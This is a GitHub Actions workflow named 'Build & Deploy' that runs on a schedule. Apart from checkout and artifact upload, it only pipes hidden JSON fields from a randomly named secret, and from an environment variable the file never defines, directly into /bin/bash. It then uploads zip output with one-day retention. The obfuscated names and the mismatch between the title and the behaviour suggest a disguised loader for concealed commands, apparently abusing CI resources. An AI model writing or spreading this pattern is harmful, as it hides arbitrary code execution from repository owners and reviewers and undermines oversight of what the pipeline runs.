name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '46 1,7,13,19 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  execute:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run
        env:
          jgsqi0131: ${{ secrets.jgsqi0131 }}
        run: |
          printf '%s' "$jgsqi0131" | jq -r .bjs8 | /bin/bash
          printf '%s' "$ibgch716" | jq -r .r818 | /bin/bash

      - name: Store results
        uses: actions/upload-artifact@v4
        with:
          name: c70kUMh7
          path: "*.zip"
          retention-days: 1
